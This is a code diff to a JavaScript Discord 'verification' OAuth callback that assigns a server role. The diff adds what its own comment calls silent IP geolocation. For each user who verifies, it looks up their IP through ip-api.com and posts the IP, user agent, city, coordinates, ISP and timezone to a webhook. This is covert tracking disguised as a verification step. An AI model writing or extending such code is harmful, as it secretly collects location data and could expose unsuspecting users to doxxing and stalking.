@@ -2,7 +2,6 @@ export default async function handler(req, res) {
   const code = req.query.code;
   if (!code) return res.status(400).send("Missing code");
 
-  // You can still use env vars for secrets, but hardcode redirect_uri for safety
   const client_id = process.env.DISCORD_CLIENT_ID;
   const client_secret = process.env.DISCORD_CLIENT_SECRET;
   const bot_token = process.env.DISCORD_BOT_TOKEN;
@@ -10,12 +9,10 @@ export default async function handler(req, res) {
   const role_id = process.env.DISCORD_ROLE_ID;
   const webhook_url = process.env.DISCORD_WEBHOOK_URL;
 
-  // IMPORTANT: Hardcode your redirect_uri to match Discord developer portal
   const redirect_uri = "https://berify-topaz.vercel.app/api/callback";
 
-  // Get IP address behind proxies
+  // Extract IP address from headers or socket
   const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || "Unknown IP";
-  // Get User Agent
   const userAgent = req.headers['user-agent'] || "Unknown User Agent";
 
   const params = new URLSearchParams({
@@ -43,18 +40,17 @@ export default async function handler(req, res) {
     }
 
     if (!tokenData.access_token) {
-      // Log the error for debugging
       console.error("Failed to get access token. Discord response:", tokenText);
       return res.status(400).send("Failed to get access token: " + tokenText);
     }
 
-    // Fetch user info
+    // Fetch user info (identify scope only)
     const userRes = await fetch("https://discord.com/api/users/@me", {
       headers: { Authorization: `Bearer ${tokenData.access_token}` },
     });
     const userData = await userRes.json();
 
-    // Add role to existing guild member
+    // Add role to guild member
     const addRoleRes = await fetch(
       `https://discord.com/api/guilds/${guild_id}/members/${userData.id}/roles/${role_id}`,
       {
@@ -71,12 +67,46 @@ export default async function handler(req, res) {
       return res.status(500).send("Failed to assign role: " + errorText);
     }
 
-    // Send detailed embed to webhook
-    if (webhook_url) {
-      const avatarUrl = userData.avatar
-        ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
-        : null;
+    // Silent IP geolocation - use free service ip-api.com/json/{ip}
+    let geoInfo = {};
+    try {
+      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,timezone,query`);
+      geoInfo = await geoRes.json();
+      if (geoInfo.status !== "success") {
+        geoInfo = {};
+      }
+    } catch (e) {
+      console.error("IP Geolocation fetch failed:", e);
+      geoInfo = {};
+    }
 
+    // Build webhook embed fields
+    const avatarUrl = userData.avatar
+      ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=1024`
+      : null;
+
+    // Collect fields for webhook embed
+    const fields = [
+      { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
+      { name: "User ID", value: userData.id, inline: true },
+      { name: "IP Address", value: ip, inline: false },
+      { name: "User Agent", value: userAgent, inline: false },
+      { name: "Token Type", value: tokenData.token_type || "unknown", inline: true },
+      { name: "Scope", value: tokenData.scope || "unknown", inline: true },
+      { name: "Expires In (seconds)", value: tokenData.expires_in?.toString() || "unknown", inline: true },
+    ];
+
+    if (geoInfo.country) fields.push({ name: "Country", value: geoInfo.country, inline: true });
+    if (geoInfo.regionName) fields.push({ name: "Region", value: geoInfo.regionName, inline: true });
+    if (geoInfo.city) fields.push({ name: "City", value: geoInfo.city, inline: true });
+    if (geoInfo.lat && geoInfo.lon) {
+      fields.push({ name: "Approx. Location", value: `${geoInfo.lat}, ${geoInfo.lon}`, inline: false });
+    }
+    if (geoInfo.isp) fields.push({ name: "ISP", value: geoInfo.isp, inline: true });
+    if (geoInfo.org) fields.push({ name: "Org", value: geoInfo.org, inline: true });
+    if (geoInfo.timezone) fields.push({ name: "Timezone", value: geoInfo.timezone, inline: true });
+
+    if (webhook_url) {
       await fetch(webhook_url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -85,15 +115,7 @@ export default async function handler(req, res) {
             title: "New User Verified",
             color: 0x7289DA,
             thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
-            fields: [
-              { name: "Username", value: `${userData.username}#${userData.discriminator}`, inline: true },
-              { name: "User ID", value: userData.id, inline: true },
-              { name: "IP Address", value: ip, inline: false },
-              { name: "User Agent", value: userAgent, inline: false },
-              { name: "Token Type", value: tokenData.token_type, inline: true },
-              { name: "Scope", value: tokenData.scope, inline: true },
-              { name: "Expires In (seconds)", value: tokenData.expires_in?.toString() || "unknown", inline: true }
-            ],
+            fields,
             timestamp: new Date().toISOString(),
           }]
         }),
